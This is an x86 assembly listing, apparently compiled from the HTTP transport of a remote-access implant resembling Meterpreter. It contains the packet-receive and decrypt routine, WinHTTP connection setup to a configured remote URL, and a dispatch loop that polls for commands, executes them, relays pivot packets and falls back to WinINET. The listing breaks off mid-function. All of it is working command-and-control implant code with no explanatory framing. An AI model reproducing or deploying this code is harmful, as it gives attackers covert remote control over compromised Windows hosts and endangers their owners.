	movl	$LC41, (%esp)
	call	_real_dprintf
	movl	-120(%ebp), %eax
	testl	%eax, %eax
	jne	L61
	movl	$4306, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L61:
	movl	-120(%ebp), %eax
	addl	%eax, -28(%ebp)
	cmpl	$32, -28(%ebp)
	je	L62
	jmp	L59
L62:
	movl	$0, -36(%ebp)
L59:
	cmpl	$0, -36(%ebp)
	je	L63
	cmpl	$0, -44(%ebp)
	jne	L64
L63:
	cmpl	$32, -28(%ebp)
	je	L65
	movl	$LC42, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L65:
	movl	$LC43, (%esp)
	call	_real_dprintf
	movl	-116(%ebp), %eax
	movl	%eax, -152(%ebp)
	movl	-112(%ebp), %eax
	movl	%eax, -148(%ebp)
	movl	-108(%ebp), %eax
	movl	%eax, -144(%ebp)
	movl	-104(%ebp), %eax
	movl	%eax, -140(%ebp)
	movl	-100(%ebp), %eax
	movl	%eax, -136(%ebp)
	movl	-96(%ebp), %eax
	movl	%eax, -132(%ebp)
	movl	-92(%ebp), %eax
	movl	%eax, -128(%ebp)
	movl	-88(%ebp), %eax
	movl	%eax, -124(%ebp)
	leal	-116(%ebp), %eax
	addl	$4, %eax
	movl	$28, 8(%esp)
	movl	%eax, 4(%esp)
	leal	-116(%ebp), %eax
	movl	%eax, (%esp)
	call	_xor_bytes
	leal	-116(%ebp), %eax
	movl	%eax, -64(%ebp)
	movl	-64(%ebp), %eax
	addl	$31, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-64(%ebp), %eax
	addl	$30, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -156(%ebp)
	movl	-64(%ebp), %eax
	addl	$29, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -160(%ebp)
	movl	-64(%ebp), %eax
	addl	$28, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -164(%ebp)
	movl	-64(%ebp), %eax
	addl	$27, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -168(%ebp)
	movl	-64(%ebp), %eax
	addl	$26, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -172(%ebp)
	movl	-64(%ebp), %eax
	addl	$25, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -176(%ebp)
	movl	-64(%ebp), %eax
	addl	$24, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -180(%ebp)
	movl	-64(%ebp), %eax
	addl	$23, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -184(%ebp)
	movl	-64(%ebp), %eax
	addl	$22, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -188(%ebp)
	movl	-64(%ebp), %eax
	addl	$21, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -192(%ebp)
	movl	-64(%ebp), %eax
	addl	$20, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -196(%ebp)
	movl	-64(%ebp), %eax
	addl	$19, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -200(%ebp)
	movl	-64(%ebp), %eax
	addl	$18, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -204(%ebp)
	movl	-64(%ebp), %eax
	addl	$17, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -208(%ebp)
	movl	-64(%ebp), %eax
	addl	$16, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -212(%ebp)
	movl	-64(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -216(%ebp)
	movl	-64(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -220(%ebp)
	movl	-64(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -224(%ebp)
	movl	-64(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -228(%ebp)
	movl	-64(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -232(%ebp)
	movl	-64(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -236(%ebp)
	movl	-64(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -240(%ebp)
	movl	-64(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -244(%ebp)
	movl	-64(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -248(%ebp)
	movl	-64(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -252(%ebp)
	movl	-64(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-64(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-64(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-64(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-64(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -256(%ebp)
	movl	-64(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 128(%esp)
	movl	-156(%ebp), %edx
	movl	%edx, 124(%esp)
	movl	-160(%ebp), %edx
	movl	%edx, 120(%esp)
	movl	-164(%ebp), %edx
	movl	%edx, 116(%esp)
	movl	-168(%ebp), %edx
	movl	%edx, 112(%esp)
	movl	-172(%ebp), %edx
	movl	%edx, 108(%esp)
	movl	-176(%ebp), %edx
	movl	%edx, 104(%esp)
	movl	-180(%ebp), %edx
	movl	%edx, 100(%esp)
	movl	-184(%ebp), %edx
	movl	%edx, 96(%esp)
	movl	-188(%ebp), %edx
	movl	%edx, 92(%esp)
	movl	-192(%ebp), %edx
	movl	%edx, 88(%esp)
	movl	-196(%ebp), %edx
	movl	%edx, 84(%esp)
	movl	-200(%ebp), %edx
	movl	%edx, 80(%esp)
	movl	-204(%ebp), %edx
	movl	%edx, 76(%esp)
	movl	-208(%ebp), %edx
	movl	%edx, 72(%esp)
	movl	-212(%ebp), %edx
	movl	%edx, 68(%esp)
	movl	-216(%ebp), %edx
	movl	%edx, 64(%esp)
	movl	-220(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-224(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-228(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-232(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-236(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-240(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-244(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-248(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-252(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-256(%ebp), %edi
	movl	%edi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC44, (%esp)
	call	_real_dprintf
	movl	-92(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__ntohl@4, %eax
	call	*%eax
	subl	$4, %esp
	subl	$8, %eax
	movl	%eax, -68(%ebp)
	movl	-68(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC45, (%esp)
	call	_real_dprintf
	movl	-68(%ebp), %eax
	addl	$32, %eax
	movl	%eax, -72(%ebp)
	movl	-72(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC46, (%esp)
	call	_real_dprintf
	movl	-68(%ebp), %eax
	movl	%eax, -32(%ebp)
	movl	-72(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -40(%ebp)
	cmpl	$0, -40(%ebp)
	jne	L66
	movl	$LC47, (%esp)
	call	_real_dprintf
	movl	$8, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L66:
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC48, (%esp)
	call	_real_dprintf
	movl	$32, 12(%esp)
	leal	-152(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$32, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__memcpy_s, %eax
	call	*%eax
	movl	-40(%ebp), %eax
	addl	$32, %eax
	movl	%eax, -76(%ebp)
	movl	-32(%ebp), %eax
	movl	%eax, -44(%ebp)
	jmp	L67
L71:
	movl	$LC49, (%esp)
	call	_real_dprintf
	subl	$1, -44(%ebp)
	movl	-52(%ebp), %eax
	movl	80(%eax), %eax
	movl	-68(%ebp), %edx
	movl	%edx, %ecx
	subl	-32(%ebp), %ecx
	movl	-76(%ebp), %edx
	addl	%edx, %ecx
	leal	-120(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	-32(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	%ecx, 4(%esp)
	movl	-56(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	testl	%eax, %eax
	jne	L68
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC50, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L68:
	movl	-120(%ebp), %eax
	testl	%eax, %eax
	jne	L69
	movl	$LC51, (%esp)
	call	_real_dprintf
	movl	$1168, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L69:
	movl	-120(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC52, (%esp)
	call	_real_dprintf
	movl	-120(%ebp), %eax
	subl	%eax, -32(%ebp)
L67:
	cmpl	$0, -32(%ebp)
	je	L70
	cmpl	$0, -44(%ebp)
	jne	L71
L70:
	cmpl	$0, -32(%ebp)
	jne	L82
	leal	-116(%ebp), %eax
	addl	$4, %eax
	movl	%eax, -64(%ebp)
	movl	-64(%ebp), %eax
	addl	$15, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, %edx
	movl	-64(%ebp), %eax
	addl	$14, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -156(%ebp)
	movl	-64(%ebp), %eax
	addl	$13, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -160(%ebp)
	movl	-64(%ebp), %eax
	addl	$12, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -164(%ebp)
	movl	-64(%ebp), %eax
	addl	$11, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -168(%ebp)
	movl	-64(%ebp), %eax
	addl	$10, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -172(%ebp)
	movl	-64(%ebp), %eax
	addl	$9, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	%esi, -176(%ebp)
	movl	-64(%ebp), %eax
	addl	$8, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	%edi, -180(%ebp)
	movl	-64(%ebp), %eax
	addl	$7, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	%ebx, -184(%ebp)
	movl	-64(%ebp), %eax
	addl	$6, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	%ecx, -188(%ebp)
	movl	-64(%ebp), %eax
	addl	$5, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edi
	movl	-64(%ebp), %eax
	addl	$4, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %esi
	movl	-64(%ebp), %eax
	addl	$3, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ebx
	movl	-64(%ebp), %eax
	addl	$2, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %ecx
	movl	-64(%ebp), %eax
	addl	$1, %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%eax, -192(%ebp)
	movl	-64(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	movl	%edx, 64(%esp)
	movl	-156(%ebp), %edx
	movl	%edx, 60(%esp)
	movl	-160(%ebp), %edx
	movl	%edx, 56(%esp)
	movl	-164(%ebp), %edx
	movl	%edx, 52(%esp)
	movl	-168(%ebp), %edx
	movl	%edx, 48(%esp)
	movl	-172(%ebp), %edx
	movl	%edx, 44(%esp)
	movl	-176(%ebp), %edx
	movl	%edx, 40(%esp)
	movl	-180(%ebp), %edx
	movl	%edx, 36(%esp)
	movl	-184(%ebp), %edx
	movl	%edx, 32(%esp)
	movl	-188(%ebp), %edx
	movl	%edx, 28(%esp)
	movl	%edi, 24(%esp)
	movl	%esi, 20(%esp)
	movl	%ebx, 16(%esp)
	movl	%ecx, 12(%esp)
	movl	-192(%ebp), %esi
	movl	%esi, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC53, (%esp)
	call	_real_dprintf
	leal	-116(%ebp), %eax
	addl	$4, %eax
	movl	%eax, (%esp)
	call	_is_null_guid
	testl	%eax, %eax
	jne	L73
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	addl	$32, %eax
	movl	$16, 8(%esp)
	leal	-116(%ebp), %edx
	addl	$4, %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_memcmp
	testl	%eax, %eax
	jne	L74
L73:
	movl	$LC54, (%esp)
	call	_real_dprintf
	movl	-72(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_decrypt_packet
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L55
L74:
	movl	$LC55, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	80(%eax), %eax
	leal	-116(%ebp), %edx
	addl	$4, %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_pivot_tree_find
	movl	%eax, -80(%ebp)
	cmpl	$0, -80(%ebp)
	je	L75
	movl	$LC56, (%esp)
	call	_real_dprintf
	movl	-72(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-80(%ebp), %eax
	movl	%eax, (%esp)
	call	_pivot_packet_dispatch
	movl	%eax, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, -40(%ebp)
	movl	12(%ebp), %eax
	movl	$0, (%eax)
	jmp	L55
L75:
	movl	$LC57, (%esp)
	call	_real_dprintf
	jmp	L55
L80:
	nop
	jmp	L55
L81:
	nop
	jmp	L55
L82:
	nop
L55:
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -84(%ebp)
	movl	$LC58, (%esp)
	call	_real_dprintf
	cmpl	$0, -40(%ebp)
	je	L76
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -40(%ebp)
L76:
	cmpl	$0, -84(%ebp)
	je	L77
	cmpl	$0, -48(%ebp)
	je	L77
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	movl	$0, -48(%ebp)
L77:
	cmpl	$0, -56(%ebp)
	je	L78
	movl	-52(%ebp), %eax
	movl	68(%eax), %eax
	movl	-56(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
L78:
	movl	8(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, (%esp)
	call	_lock_release
	movl	$LC59, (%esp)
	call	_real_dprintf
	movl	-84(%ebp), %eax
	leal	-12(%ebp), %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
	.section .rdata,"dr"
LC60:
	.ascii "[WINHTTP] Initialising ...\0"
	.align 4
LC61:
	.ascii "[DISPATCH] Configuring with proxy: %S\0"
	.align 4
LC62:
	.ascii "[DISPATCH] Failed WinHttpOpen: %d\0"
	.align 4
LC63:
	.ascii "[DISPATCH] Configured hInternet: 0x%.8x\0"
	.align 4
LC64:
	.ascii "[DISPATCH] About to crack URL: %S\0"
LC65:
	.ascii "[DISPATCH] Configured URI: %S\0"
LC66:
	.ascii "[DISPATCH] Host: %S Port: %u\0"
	.align 4
LC67:
	.ascii "[DISPATCH] Failed WinHttpConnect: %d\0"
	.align 4
LC68:
	.ascii "[DISPATCH] Configured hConnection: 0x%.8x\0"
	.text
	.def	_server_init_winhttp;	.scl	3;	.type	32;	.endef
_server_init_winhttp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$2152, %esp
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	$LC60, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	32(%eax), %eax
	testl	%eax, %eax
	je	L84
	movl	-12(%ebp), %eax
	movl	32(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC61, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	32(%eax), %edx
	movl	-12(%ebp), %eax
	movl	20(%eax), %eax
	movl	$0, 16(%esp)
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	call	_WinHttpOpen@20
	subl	$20, %esp
	movl	-12(%ebp), %edx
	movl	%eax, 4(%edx)
	jmp	L85
L84:
	movl	-12(%ebp), %eax
	movl	20(%eax), %eax
	movl	$0, 16(%esp)
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	_WinHttpOpen@20
	subl	$20, %esp
	movl	-12(%ebp), %edx
	movl	%eax, 4(%edx)
L85:
	movl	-12(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L86
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC62, (%esp)
	call	_real_dprintf
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	jmp	L90
L86:
	movl	-12(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC63, (%esp)
	call	_real_dprintf
	movl	$1024, 8(%esp)
	movl	$0, 4(%esp)
	leal	-1096(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	$1024, 8(%esp)
	movl	$0, 4(%esp)
	leal	-2120(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	$60, 8(%esp)
	movl	$0, 4(%esp)
	leal	-72(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	$60, -72(%ebp)
	movl	$511, -52(%ebp)
	leal	-1096(%ebp), %eax
	movl	%eax, -56(%ebp)
	movl	$511, -24(%ebp)
	leal	-2120(%ebp), %eax
	movl	%eax, -28(%ebp)
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC64, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	44(%eax), %eax
	leal	-72(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	_WinHttpCrackUrl@16
	subl	$16, %esp
	movl	-12(%ebp), %eax
	movl	24(%eax), %eax
	testl	%eax, %eax
	je	L88
	movl	-12(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, (%esp)
	call	_free
	movl	-12(%ebp), %eax
	movl	$0, 24(%eax)
L88:
	leal	-2120(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___wcsdup, %eax
	call	*%eax
	movl	-12(%ebp), %edx
	movl	%eax, 24(%edx)
	call	_current_unix_timestamp
	movl	8(%ebp), %edx
	movl	%eax, 64(%edx)
	movl	-12(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC65, (%esp)
	call	_real_dprintf
	movzwl	-48(%ebp), %eax
	movzwl	%ax, %eax
	movl	%eax, 8(%esp)
	leal	-1096(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC66, (%esp)
	call	_real_dprintf
	movzwl	-48(%ebp), %eax
	movzwl	%ax, %edx
	movl	-12(%ebp), %eax
	movl	4(%eax), %eax
	movl	$0, 12(%esp)
	movl	%edx, 8(%esp)
	leal	-1096(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_WinHttpConnect@16
	subl	$16, %esp
	movl	-12(%ebp), %edx
	movl	%eax, 8(%edx)
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	jne	L89
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, 4(%esp)
	movl	$LC67, (%esp)
	call	_real_dprintf
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	jmp	L90
L89:
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC68, (%esp)
	call	_real_dprintf
	movl	$0, %eax
L90:
	leave
	ret
	.section .rdata,"dr"
LC69:
	.ascii "[HTTP] Deinitialising ...\0"
	.text
	.def	_server_deinit_http;	.scl	3;	.type	32;	.endef
_server_deinit_http:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	$LC69, (%esp)
	call	_real_dprintf
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	je	L92
	movl	-12(%ebp), %eax
	movl	68(%eax), %eax
	movl	-12(%ebp), %edx
	movl	8(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	-12(%ebp), %eax
	movl	$0, 8(%eax)
L92:
	movl	-12(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L93
	movl	-12(%ebp), %eax
	movl	68(%eax), %eax
	movl	-12(%ebp), %edx
	movl	4(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	-12(%ebp), %eax
	movl	$0, 4(%eax)
L93:
	movl	-12(%ebp), %eax
	movl	56(%eax), %eax
	testl	%eax, %eax
	je	L94
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_move_to_wininet
	movl	-12(%ebp), %eax
	movl	$0, 56(%eax)
L94:
	movl	$1, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 4
LC70:
	.ascii "[DISPATCH] Shutting down server due to communication timeout\0"
	.align 4
LC71:
	.ascii "[DISPATCH] Shutting down server due to hardcoded expiration time\0"
LC72:
	.ascii "Timestamp: %u  Expiration: %u\0"
	.align 4
LC73:
	.ascii "[DISPATCH] server dispatch thread signaled to terminate...\0"
	.align 4
LC74:
	.ascii "[DISPATCH] Reading data from the remote side...\0"
	.align 4
LC75:
	.ascii "[DISPATCH] Failed to work correctly with WinHTTP, moving over to WinINET\0"
	.align 4
LC76:
	.ascii "[DISPATCH] no pending packets, sleeping for %dms...\0"
	.align 4
LC77:
	.ascii "[DISPATCH] Returned result: %d\0"
LC78:
	.ascii "continue\0"
LC79:
	.ascii "stop\0"
	.align 4
LC80:
	.ascii "[DISPATCH] command_process result: %s\0"
	.align 4
LC81:
	.ascii "[DISPATCH] Recieved hot-patched URL for stageless: %S\0"
LC82:
	.ascii "[DISPATCH] Old URI is: %S\0"
LC83:
	.ascii "[DISPATCH] Old URL is: %S\0"
	.align 4
LC84:
	.ascii "[DISPATCH] New URI is bigger by %d\0"
LC85:
	.ascii "[DISPATCH] %d csr: %p -> %S\0"
	.align 4
LC86:
	.ascii "[DISPATCH] Pointer is at: %p -> %S\0"
LC87:
	.ascii "[DISPATCH] New URL is: %S\0"
	.align 4
LC88:
	.ascii "[DISPATCH] Packet was NULL, this indicates that it was a pivot packet\0"
	.text
	.def	_server_dispatch_http;	.scl	3;	.type	32;	.endef
_server_dispatch_http:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$68, %esp
	movl	$1, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -52(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -24(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	movl	48(%eax), %eax
	movl	%eax, -44(%ebp)
	jmp	L97
L123:
	movl	-40(%ebp), %eax
	movl	52(%eax), %eax
	testl	%eax, %eax
	je	L98
	movl	-40(%ebp), %eax
	movl	64(%eax), %edx
	movl	-40(%ebp), %eax
	movl	52(%eax), %eax
	leal	(%edx,%eax), %ebx
	call	_current_unix_timestamp
	cmpl	%eax, %ebx
	jge	L98
	movl	$LC70, (%esp)
	call	_real_dprintf
	jmp	L99
L98:
	movl	8(%ebp), %eax
	movl	72(%eax), %eax
	testl	%eax, %eax
	je	L100
	movl	8(%ebp), %eax
	movl	72(%eax), %ebx
	call	_current_unix_timestamp
	cmpl	%eax, %ebx
	jge	L100
	movl	$LC71, (%esp)
	call	_real_dprintf
	movl	8(%ebp), %eax
	movl	72(%eax), %ebx
	call	_current_unix_timestamp
	movl	%ebx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$LC72, (%esp)
	call	_real_dprintf
	jmp	L99
L100:
	movl	12(%ebp), %eax
	movl	8(%eax), %eax
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	_event_poll
	testl	%eax, %eax
	je	L101
	movl	$LC73, (%esp)
	call	_real_dprintf
	jmp	L99
L101:
	movl	$LC74, (%esp)
	call	_real_dprintf
	leal	-52(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_receive_http
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L102
	cmpl	$4306, -16(%ebp)
	jne	L103
	call	_current_unix_timestamp
	movl	-40(%ebp), %edx
	movl	%eax, 64(%edx)
	jmp	L104
L103:
	cmpl	$12029, -16(%ebp)
	jne	L105
	movl	$LC75, (%esp)
	call	_real_dprintf
	movl	-44(%ebp), %eax
	movl	$1, 56(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 8(%eax)
	movl	$0, -16(%ebp)
	jmp	L99
L105:
	cmpl	$12169, -16(%ebp)
	jne	L106
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %eax
	cmpl	%eax, %edx
	jne	L125
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	60(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 12(%eax)
	jmp	L125
L106:
	cmpl	$1610, -16(%ebp)
	je	L126
L104:
	movl	-20(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	movl	%eax, -24(%ebp)
	cmpl	$9, -20(%ebp)
	jbe	L108
	movl	-24(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	movl	%eax, -24(%ebp)
L108:
	addl	$1, -20(%ebp)
	movl	$10000, %eax
	cmpl	$10000, -24(%ebp)
	cmovbe	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC76, (%esp)
	call	_real_dprintf
	movl	$10000, %eax
	cmpl	$10000, -24(%ebp)
	cmovbe	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__Sleep@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L97
L102:
	call	_current_unix_timestamp
	movl	-40(%ebp), %edx
	movl	%eax, 64(%edx)
	movl	$0, -20(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$LC77, (%esp)
	call	_real_dprintf
	movl	-52(%ebp), %eax
	testl	%eax, %eax
	je	L109
	movl	-52(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_command_handle
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L110
	movl	$LC78, %eax
	jmp	L111
L110:
	movl	$LC79, %eax
L111:
	movl	%eax, 4(%esp)
	movl	$LC80, (%esp)
	call	_real_dprintf
	movl	-44(%ebp), %eax
	movl	28(%eax), %eax
	testl	%eax, %eax
	je	L97
	movl	-44(%ebp), %eax
	movl	28(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC81, (%esp)
	call	_real_dprintf
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC82, (%esp)
	call	_real_dprintf
	movl	-40(%ebp), %eax
	movl	44(%eax), %eax
	movl	%eax, 4(%esp)
	movl	$LC83, (%esp)
	call	_real_dprintf
	movl	-44(%ebp), %eax
